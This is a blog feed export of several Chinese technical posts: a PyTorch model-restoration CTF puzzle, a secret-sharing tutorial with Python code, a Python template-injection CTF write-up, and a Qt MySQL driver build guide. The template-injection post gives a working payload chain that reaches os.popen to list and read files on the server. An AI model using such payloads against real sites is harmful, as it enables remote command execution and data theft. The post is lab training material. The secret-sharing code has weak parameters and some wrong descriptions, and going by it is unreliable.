<p>左旋——自己变为右孩子的左孩子。原来右孩子的左孩子变为自己的右孩子<br>右旋——自己变为左孩子的右孩子。原来左孩子的右孩子变为自己的左孩子</p>
<p><img src="/image-12.png"></p>
<p>插入过程时旋转上升</p>
<p><img src="/2023/12/26/%E7%AE%97%E6%B3%95-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-14.png"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>【网信中山】Pytorch 神经网络复原</title>
    <url>/2023/10/29/%E7%BD%91%E4%BF%A1%E4%B8%AD%E5%B1%B1-AI-%E9%A2%98/</url>
    <content><![CDATA[<h1 id="【网信中山】Misc-Pytorch-神经网络复原"><a href="#【网信中山】Misc-Pytorch-神经网络复原" class="headerlink" title="【网信中山】Misc Pytorch 神经网络复原"></a>【网信中山】Misc Pytorch 神经网络复原</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>中山杯打到后期，放出了一道 misc 题，下载附件拿到一个压缩包。解压获得了如下文件：</p>
<ul>
<li>.npy 文件 : 用于存储 numpy 数组</li>
<li>label.json 文件 : 用于存储模型标签</li>
<li>MyLeNet.pt 文件 :  PyTorch 的序列化文件格式，用于保存和加载 PyTorch 模型的参数和状态。这种格式方便用户在训练过程中保存检查点，以及在后续的推理或继续训练过程中加载模型。</li>
</ul>
<h2 id="思考过程"><a href="#思考过程" class="headerlink" title="思考过程"></a>思考过程</h2><p>在这里思路其实很明显： 先根据 pt 文件复原模型，然后将 npy 文件全部喂给模型，得到的输出根据 label.json文件做标签分类，然后再拼接获得flag。</p>
<p>这里最难的就是模型的复原，完全不知道他使用的哪个非线性方法，我试了很久也没试出来，跑出来的结果对称性非常强，一度让我以为是还要解码，最后遗憾告终，对这类题还是太陌生了。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>比赛结束后看了唯一做出来的那队的 WP，才发现居然要逆MyLeNet.pt文件，直接把 MyLeNet 文件放到 CyberChef 里，看内容，发现里面有 sigmoid 和 relu 非线性方法，由于只有两种非线性方法，一共四个层，做一个排列组合就能够拿到 flag 了，</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义模型结构，与提供的 MyLeNet.pt 结构匹配</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLeNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MyLeNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">1</span>, <span class="number">6</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), stride=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">6</span>, <span class="number">16</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), stride=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">256</span>, <span class="number">120</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">62</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># 这个地方要排列组合去尝试</span></span><br><span class="line">        x = torch.sigmoid(self.conv1(x))</span><br><span class="line">        x = torch.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = torch.relu(self.conv2(x))</span><br><span class="line">        x = torch.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">256</span>)</span><br><span class="line">        x = torch.sigmoid(self.fc1(x))</span><br><span class="line">        x = torch.relu(self.fc2(x))</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模型参数</span></span><br><span class="line">model = MyLeNet()</span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&#x27;MyLeNet.pt&#x27;</span>, map_location=torch.device(<span class="string">&#x27;cpu&#x27;</span>)))</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"><span class="comment"># 定义一个空字符串用于拼接结果</span></span><br><span class="line">predicted_string = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载标签映射</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;label.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    label_map = json.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载并预测样本</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):</span><br><span class="line">    sample = np.load(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.npy&quot;</span>)</span><br><span class="line">    sample = torch.tensor(sample, dtype=torch.float32).unsqueeze(<span class="number">0</span>).unsqueeze(<span class="number">0</span>)  <span class="comment"># 添加 batch 和 channel 维度</span></span><br><span class="line">    prediction = model(sample)</span><br><span class="line">    predicted_label = torch.argmax(prediction, dim=<span class="number">1</span>).item()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 根据标签映射找到预测的字符</span></span><br><span class="line">    predicted_character = [char <span class="keyword">for</span> char, label <span class="keyword">in</span> label_map.items() <span class="keyword">if</span> label == predicted_label][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将预测的字符添加到字符串中</span></span><br><span class="line">    predicted_string += predicted_character</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印拼接后的完整字符串</span></span><br><span class="line"><span class="built_in">print</span>(predicted_string)</span><br></pre></td></tr></table></figure>

<p>然后试的话发现其中 sigmoid+relu+sigmoid+relu 这个组合的结果为:</p>
<pre><code>ZmxhZ3thNzkzZjI1Ny01Nzg4LWYwZjYtY2E5Zi00YTgyZWE3MmUwYzZ9
</code></pre>
<p>眼熟的 base64，拿去 base64 解码即可获得 flag：</p>
<p>flag{a793f257-5788-f0f6-ca9f-4a82ea72e0c6}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>神经网络</tag>
      </tags>
  </entry>
  <entry>
    <title>【隐私计算】 秘密共享方案</title>
    <url>/2023/11/13/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97-%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/</url>
    <content><![CDATA[<h1 id="【隐私计算】-秘密共享方案"><a href="#【隐私计算】-秘密共享方案" class="headerlink" title="【隐私计算】 秘密共享方案"></a>【隐私计算】 秘密共享方案</h1><h2 id="Shamir-秘密共享方案"><a href="#Shamir-秘密共享方案" class="headerlink" title="Shamir 秘密共享方案"></a>Shamir 秘密共享方案</h2><p>Shamir’s Secret Sharing Scheme is based on Lagrange Interception.</p>
<p>Now suppose there are $n$ people, and $t$ is the threshold for secret recovery</p>
<p>Construct a polynimal at first, the form like:</p>
<p>$$ P(x) &#x3D; a_{t-1}x^{t-1} + a_{t-2}x^{t-2} + \cdots + a_2x^2 + a_1x + a_0 $$</p>
<p>Setting $a_0$ as the secret. Each person is allocated a secret share represented as $(i, a_{i}x^{i})$.</p>
<p>For the secret recovery, we need to construct a Lagrange Interception to compute the coefficients $a_0$(secret). The Lagrange Interpolation method is as follows</p>
<p>$$L(x) &#x3D; \sum_{j&#x3D;0}^{n} y_j \prod_{\substack{i&#x3D;0 \ i \neq j}}^{n} \frac{x - x_i}{x_j - x_i}$$</p>
<p>In the above formula, by setting $x &#x3D; 0$, the value of  $a_0$ can be calculated.</p>
<p>Python code for implementing the Shamir Secret Sharing Scheme:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Shamir</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"> </span><br><span class="line"><span class="comment"># a large size, make sures that the shares can not to be brute-forced</span></span><br><span class="line">FIELD_SIZE = <span class="number">10</span>**<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_coefficients</span>(<span class="params">t, secret</span>):</span><br><span class="line">    coeff = [random.randrange(<span class="number">0</span>, FIELD_SIZE) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t-<span class="number">1</span>)]</span><br><span class="line">    coeff.append(secret) <span class="comment"># secret is in the last</span></span><br><span class="line">    <span class="keyword">return</span> coeff</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_polynomial</span>(<span class="params">x, coefficients</span>):</span><br><span class="line">    polynomial = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> index, values <span class="keyword">in</span> <span class="built_in">enumerate</span>(coefficients[::-<span class="number">1</span>]): <span class="comment"># we need to reverse in here because the secret(a0) is in the last</span></span><br><span class="line">        polynomial += x ** index * values</span><br><span class="line">    <span class="keyword">return</span> polynomial</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_shares</span>(<span class="params">n, t, secret</span>):</span><br><span class="line">    coefficients = compute_coefficients(t,secret)</span><br><span class="line">    shares = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">        x = random.randrange(<span class="number">0</span>,FIELD_SIZE)</span><br><span class="line">        shares.append((x, compute_polynomial(x,coefficients)))</span><br><span class="line">    <span class="keyword">return</span> shares</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reconstruct_secret</span>(<span class="params">shares</span>):</span><br><span class="line">    sums = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, share_i <span class="keyword">in</span> <span class="built_in">enumerate</span>(shares):</span><br><span class="line">        xi, yi = share_i</span><br><span class="line">        <span class="comment"># use decimal to make sure that we can get an accurate integer</span></span><br><span class="line">        prod = Decimal(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> j, share_j <span class="keyword">in</span> <span class="built_in">enumerate</span>(shares):</span><br><span class="line">            xj, _ = share_j</span><br><span class="line">            <span class="keyword">if</span> i!=j:</span><br><span class="line">                prod *= Decimal(Decimal(xj)/(xj-xi)) <span class="comment"># lagrange interception</span></span><br><span class="line">                </span><br><span class="line">        prod *= yi</span><br><span class="line">        sums += prod</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">round</span>(Decimal(sums),<span class="number">0</span>)) <span class="comment"># get the integer secret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Driver code</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># n peoples, and the threshold is t</span></span><br><span class="line">    t, n = <span class="number">3</span>, <span class="number">5</span></span><br><span class="line">    secret = <span class="number">114514</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Original Secret: <span class="subst">&#123;secret&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Generate the shares</span></span><br><span class="line">    shares = generate_shares(n, t, secret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Shares: <span class="subst">&#123;<span class="string">&quot;, &quot;</span>.join(<span class="built_in">str</span>(share) <span class="keyword">for</span> share <span class="keyword">in</span> shares)&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Reconstruct the secret</span></span><br><span class="line">    <span class="comment"># Picking t shares randomly for</span></span><br><span class="line">    pool = random.sample(shares, t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Reconstructed secret: <span class="subst">&#123;reconstruct_secret(pool)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>Reference: <a href="https://www.geeksforgeeks.org/implementing-shamirs-secret-sharing-scheme-in-python/">https://www.geeksforgeeks.org/implementing-shamirs-secret-sharing-scheme-in-python/</a></p>
<h2 id="基于中国剩余定理的秘密共享方案"><a href="#基于中国剩余定理的秘密共享方案" class="headerlink" title="基于中国剩余定理的秘密共享方案"></a>基于中国剩余定理的秘密共享方案</h2><p>CRT(Chinese Remainder Theory) can be used to solve the Secret Sharing. My seudocode is as follow:</p>
<p><img src="/2023/11/13/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97-%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/image-1.png"></p>
<p>python code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基于中国剩余定理的秘密共享方案</span></span><br><span class="line"><span class="keyword">import</span> sympy <span class="keyword">as</span> sp</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> solve_crt,generate_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_primes</span>(<span class="params">n, S</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成 n 个根据 S 调整大小的随机质数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    lower_bound = <span class="number">10</span>  <span class="comment"># 下限</span></span><br><span class="line">    upper_bound = <span class="built_in">int</span>(math.sqrt(S))  <span class="comment"># 上限</span></span><br><span class="line">    primes = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        primes.append(sp.randprime(lower_bound, upper_bound))</span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_conditions</span>(<span class="params">numbers, t, S</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    检查条件是否满足</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    numbers.sort()</span><br><span class="line">    product_smallest_t = math.prod(numbers[:t])</span><br><span class="line">    product_largest_t_minus_1 = math.prod(numbers[-(t-<span class="number">1</span>):])</span><br><span class="line">    <span class="keyword">return</span> product_smallest_t &gt; S <span class="keyword">and</span> product_largest_t_minus_1 &lt; S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_numbers</span>(<span class="params">n, t, S</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    找到满足条件的 n 个互质随机数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        numbers = generate_primes(n, S)</span><br><span class="line">        <span class="keyword">if</span> check_conditions(numbers, t, S):</span><br><span class="line">            <span class="keyword">return</span> numbers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_shares</span>(<span class="params">s, k, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Implements the Asmuth and Bloom&#x27;s CRT-based secret sharing algorithm.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    primes = find_numbers(n,k,s)</span><br><span class="line">    shares = [s % mi <span class="keyword">for</span> mi <span class="keyword">in</span> primes]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> shares, primes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">select_random_k_elements</span>(<span class="params">shares_zip, k</span>):</span><br><span class="line">    random_selection = random.sample(shares_zip, k)</span><br><span class="line">    selected_shares, selected_moduli = <span class="built_in">zip</span>(*random_selection)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(selected_shares), <span class="built_in">list</span>(selected_moduli)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example usage:</span></span><br><span class="line">secret = <span class="number">1145141919</span>  <span class="comment"># The secret to be shared</span></span><br><span class="line">k = <span class="number">3</span>                <span class="comment"># Minimum number of shares needed to reconstruct the secret</span></span><br><span class="line">n = <span class="number">5</span>                <span class="comment"># Total number of shares to be distributed</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate the shares</span></span><br><span class="line">shares, moduli = generate_shares(secret, k, n)</span><br><span class="line">shares_zip = <span class="built_in">list</span>(<span class="built_in">zip</span>(shares, moduli))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shares:&quot;</span>, shares_zip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reconstruct the secret</span></span><br><span class="line">shares_pool, moduli_pool = select_random_k_elements(shares_zip, k)</span><br><span class="line">res = solve_crt(shares_pool,moduli_pool)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Secret:&quot;</span>, res)</span><br></pre></td></tr></table></figure>

<h2 id="Brickell-Secret-Sharing"><a href="#Brickell-Secret-Sharing" class="headerlink" title="Brickell Secret Sharing"></a>Brickell Secret Sharing</h2><p>The Brickell Secret Sharing Scheme is based on multi-dimensional vectors, allowing for the specification of designated groups for secret recovery.</p>
<p>Steps:</p>
<h3 id="Sharing-Generation"><a href="#Sharing-Generation" class="headerlink" title="Sharing Generation:"></a>Sharing Generation:</h3><ol>
<li>Assuming the secret &#x3D; $S$, $n$ &#x3D; 4, the vector dimension is $d$ &#x3D; 3.</li>
<li>Define the reconstruct rules ${(v1,v2,v3),(v1,v5)}$, means that person(1~3) and person(1 and 5) can recover the secret.</li>
<li>Generate v1 to v5, ensuring that any group of vectors can linearly construct $(1,0,0)$</li>
<li>Generate d-1 random numbers ${a_1,a_2…,a_{d-1}}$. In here, generate $a_1 &#x3D; S, a_2 &#x3D; 55$, $a_3 &#x3D; 28$</li>
<li>Compute the sharing, $S_i &#x3D; a * v_i$, and the sharing is $(S_i, i)$</li>
</ol>
<h3 id="Secret-Reconstruction"><a href="#Secret-Reconstruction" class="headerlink" title="Secret Reconstruction"></a>Secret Reconstruction</h3><ol>
<li>Collect the sharing, ensuring that the sharing groups follow the rules ${(v1,v2,v3),(v1,v5)}$, assuming the $S_1 &#x3D; 55, S_2 &#x3D; 10, S_3 &#x3D; 17$</li>
<li>use the sharing group to linearly construct $(1,0,0)$, $c_1v_1+c_2v_2+c_3v_3 &#x3D; (1,0,0)$, get the coefficients $c_1&#x3D;-1, c_2&#x3D;1, c_3&#x3D;1$</li>
<li>Recover the $S$, $S &#x3D; c_1S_1+c_2S_2+c_3S_3$</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Secret sharing schemes are widely used in privacy computing. Here is a summary of their advantages and disadvantages.</p>
<h3 id="Advantages"><a href="#Advantages" class="headerlink" title="Advantages"></a>Advantages</h3><ol>
<li>It allows for the addition of new shareholders without changing the existing shareholders’ secret shares, demonstrating excellent scalability.</li>
<li>Based on the original shared secret key, the secret shares can be invalidated by altering other terms without changing the constant term.</li>
</ol>
<h3 id="Disadvantages"><a href="#Disadvantages" class="headerlink" title="Disadvantages"></a>Disadvantages</h3><ol>
<li>It relies on the credibility of the secret distributor. If the distributor is dishonest and distributes a fake share to a participant, it can cause confusion during the sharing process.</li>
<li>Some participants may submit invalid secret shares, preventing the correct secret from being recovered. A secure point-to-point channel needs to be established between the secret distributor and the participants.</li>
</ol>
]]></content>
      <categories>
        <category>隐私计算</category>
      </categories>
      <tags>
        <tag>隐私计算</tag>
        <tag>秘密共享</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】 easy_python 模板注入1</title>
    <url>/2023/09/18/python-template1/</url>
    <content><![CDATA[<h3 id="Python-模板注入"><a href="#Python-模板注入" class="headerlink" title="Python 模板注入"></a>Python 模板注入</h3><p>拿到题目，直接告诉我们是 python template 问题，以 python 模板注入的角度切入。<br>对于很多网站，为了方便，都会套用一个 html 模板，模板会给一个接口，用 python 将这段代码以作为变量的形式套入进模板。<br>这里的模板注入就是，我们可以在这个变量里面注入我们想要的代码，获取到信息，注入的时候用花括号“{ {} }”包裹住 code。本题中，我们测试{ {1+5} }：<br><img src="/2023/09/18/python-template1/image1.jpg"><br>果不其然，代码执行了，返回了 6，接下来进行正式的注入，常见的注入方法有以下几种：<br>以下所有的方法均要被“__” 包裹</p>
<ul>
<li>__class__ ： 返回对象所属的类。</li>
<li>__mro__ : 返回基类元组。</li>
<li>__base__：返回基类。</li>
<li>__subclasses__()[]：返回子类。</li>
<li>__init__ ：初始化类。</li>
<li>__globals[]__ ： 对包含函数全局变量的字典的引用，说人话就是调用全局的包，如’os’等。</li>
</ul>
<p>在注入之后我们通常使用两种方法来操控控制台获取信息：</p>
<ul>
<li>os.popen(“file_name”) ：返回文件内容。</li>
<li>os.system ： 返回状态码。</li>
</ul>
<p>开始操作，构造 [].__class__.__mro__ 并发送：<br><img src="/2023/09/18/python-template1/image2.jpg"><br>可以看到获取到了两个基类，我们选用 mro[1] 获取其中一个基类，然后再在这个基类里面调取他所有可用的子类，构造 [].__class__.__mro__[1].__subclasses__() 发送，获取到所有子类：<br><img src="/2023/09/18/python-template1/image3.jpg"><br>我们要找到 os.popen 的基类site._Printer类，用它来调用 popen，对此，我们先要找到 site._Printer在subclasses 中的索引，调用以下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot; &quot;</span>                  <span class="comment">#输入所有 subclasses 内容</span></span><br><span class="line">str_new = []</span><br><span class="line">sub_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>[i]!=<span class="string">&quot;,&quot;</span> <span class="keyword">and</span> <span class="built_in">str</span>[i]!=<span class="string">&quot; &quot;</span>:</span><br><span class="line">        sub_str+=<span class="built_in">str</span>[i]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>[i]==<span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        str_new.append(sub_str)</span><br><span class="line">        sub_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">result = str_new.index(<span class="string">&quot;&lt;class&#x27;site._Printer&#x27;&gt;&quot;</span>,<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>))</span><br><span class="line">result</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>获取到结果为 71，我们定位到 subclasses 中第71 个元素，并初始化这个类，调用他的全局变量 os 下的 popen 函数，这里使用‘ls’来查看所有文件。<br>于是构造 :<br>[].__class__.__mro__[1].__subclasses__()[71].__init__.__globals__[‘os’].popen(‘ls’).read()<br>获得结果：<br><img src="/2023/09/18/python-template1/image4.jpg"><br>这里用空格隔开了几个文件，发现了有fl4g文件，我们在 popen 里使用 cat fl4g去读他里面的内容(记得要用%20 代替空格，不然 url 不一定在 safari 有效)<br>[].__class__.__mro__[1].__subclasses__()[71].__init__.__globals__[‘os’].popen(‘cat%20fl4g’’).read()<br>得到 flag：<br><img src="/2023/09/18/python-template1/image5.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>【配置教程】M2 Mac 配置 QT 的 MYSQL 驱动</title>
    <url>/2024/01/20/QT%E9%85%8D%E7%BD%AEMysql%E9%A9%B1%E5%8A%A8/</url>
    <content><![CDATA[<h1 id="【配置教程】M2-Mac-配置-QT-的-MYSQL-驱动"><a href="#【配置教程】M2-Mac-配置-QT-的-MYSQL-驱动" class="headerlink" title="【配置教程】M2 Mac 配置 QT 的 MYSQL 驱动"></a>【配置教程】M2 Mac 配置 QT 的 MYSQL 驱动</h1><p>经过了足足两天的折磨配置，博主终于配置好了 QT 的 mysql 驱动，不经感叹，QT 是不是和 mysql 有什么深仇大恨，这里记录一下整个过程，以免不时之需。</p>
<h2 id="Mac-配置-QT"><a href="#Mac-配置-QT" class="headerlink" title="Mac 配置 QT"></a>Mac 配置 QT</h2><p>我这里使用QT5，没有那么多问题，安装指令</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">brew install qt@<span class="number">5</span></span><br><span class="line">brew install qt-creator</span><br></pre></td></tr></table></figure>

<p>安装好之后打开 qt-creator，然后在 creator 里配置 qt 的环境，qt 的环境要找到刚刚安装好的 qt 目录，然后在里面找到 qmake，可以直接搜索去找，配置好后如下：</p>
<p><img src="/2024/01/20/QT%E9%85%8D%E7%BD%AEMysql%E9%A9%B1%E5%8A%A8/image.png"></p>
<p>Kits 这里记得也要选上 Qt-version</p>
<p><img src="/2024/01/20/QT%E9%85%8D%E7%BD%AEMysql%E9%A9%B1%E5%8A%A8/image-1.png"></p>
<h2 id="配置-Mysql-驱动"><a href="#配置-Mysql-驱动" class="headerlink" title="配置 Mysql 驱动"></a>配置 Mysql 驱动</h2><p>这一步是最折磨的，配置了足足一天半，首先我们使用 <code>brew install</code> 安装下来的 Qt 默认是没有 mysql 驱动的，只有 sqlite 的驱动，所以我这里的解决方法就是自己编译一个。</p>
<p>去qt 官网下载和自己版本一样的 qt 源码：</p>
<p><a href="https://download.qt.io/archive/qt/">https://download.qt.io/archive/qt/</a></p>
<p>下载好后解压打开，进入目录 <code>/qtbase/src/plugins/sqldrivers/mysql</code>，编辑 <code>mysql.pro</code> 文件（记得去掉我的中文注释）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TARGET = qsqlmysql</span><br><span class="line"></span><br><span class="line">HEADERS += $$PWD/qsql_mysql_p.h</span><br><span class="line">SOURCES += $$PWD/qsql_mysql.cpp $$PWD/main.cpp</span><br><span class="line"></span><br><span class="line"># 新增行，写你的 mysql include 路径</span><br><span class="line">INCLUDEPATH += &quot;/opt/homebrew/Cellar/mysql/8.1.0/include&quot;</span><br><span class="line"></span><br><span class="line"># 新增行，写你的 mysql lib里的动态链接库路径</span><br><span class="line"># 名字是差不多的，区别是后面的数字，可能是20,21,22，取决于Mysql版本</span><br><span class="line">LIBS += &quot;/opt/homebrew/Cellar/mysql/8.1.0/lib/libmysqlclient.22.dylib&quot;</span><br><span class="line"></span><br><span class="line"># 新增行，写 sqldrivers 的路径</span><br><span class="line">DESTIR = &quot;/Users/a214/Downloads/qt-everywhere-src-5.15.12/qtbase/src/plugins/sqldrivers&quot;</span><br><span class="line"></span><br><span class="line"># 新增行</span><br><span class="line">PLUGIN_CLASS_NAME = QMYSQLDriverPlugin</span><br><span class="line"></span><br><span class="line"># 新增行</span><br><span class="line">include(../qsqldriverbase.pri)</span><br><span class="line"></span><br><span class="line">#QMAKE_USE += mysql</span><br><span class="line"></span><br><span class="line">OTHER_FILES += mysql.json</span><br></pre></td></tr></table></figure>

<p><code>QMAKE_USE</code> 要注释掉，然后保存关闭。这里需要注意的是，一定要检查你的 mysql 里的 <code>lib</code> 文件夹的结构，一定要是 lib 文件夹打开后，就有 <code>libmysqlclient.22.dylib</code> 这个文件，不然很坑的，如果没有，就挪一下文件。</p>
<p>然后回到目录 <code>/qtbase/src/plugins/sqldrivers</code>，用终端打开，先要配置环境变量，这里的 <code>QTDIR</code> 写的是你用 <code>brew install</code> 安装的 qt 的目录。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">export QTDIR=/opt/homebrew/Cellar/qt@<span class="number">5</span>/<span class="number">5</span>.<span class="number">15</span>.<span class="number">12</span></span><br><span class="line">export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$QTDIR/lib</span><br></pre></td></tr></table></figure>

<p>然后执行 qmake，记得加上 mysql 前缀，前缀是你 mysql 的文件位置。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">qmake -- MYSQL_PREFIX=/opt/homebrew/Cellar/mysql/<span class="number">8</span>.<span class="number">1</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>执行完后，如果成功，你是可以看到如下消息的：</p>
<p><img src="/2024/01/20/QT%E9%85%8D%E7%BD%AEMysql%E9%A9%B1%E5%8A%A8/image-2.png"></p>
<p>如果没成功，很有可能就是你 mysql 的路径不对，或者 mysql 里的文件结构不对，要检查 <code>lib</code>。修改完之后，在当前目录下搜索 <code>config.cache</code> ，把这个缓存文件删掉，再重新 <code>qmake</code>，不然结果和上次一样（这点卡了很久）。</p>
<p>编译完成后，由于博主没有安装 <code>PostgreSQL</code> ，直接 <code>make</code> 会报错，显示找不到头文件，所以只编译安装 mysql<br>的文件，终端进入到目录 <code>/qtbase/src/plugins/sqldrivers/mysql</code>，在当前目录执行</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>

